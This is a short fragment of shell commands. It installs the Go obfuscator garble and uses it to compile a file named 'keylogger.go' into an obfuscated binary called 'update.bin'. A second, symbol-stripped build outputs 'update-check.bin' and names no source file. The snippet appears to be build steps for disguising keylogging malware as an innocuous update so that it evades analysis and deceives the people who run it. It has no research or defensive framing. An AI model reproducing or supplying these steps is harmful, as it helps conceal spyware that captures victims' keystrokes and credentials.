go install mvdan.cc/garble@latest
garble build -o update.bin keylogger.go
garble build -ldflags="-s -w" -o update-check.bin 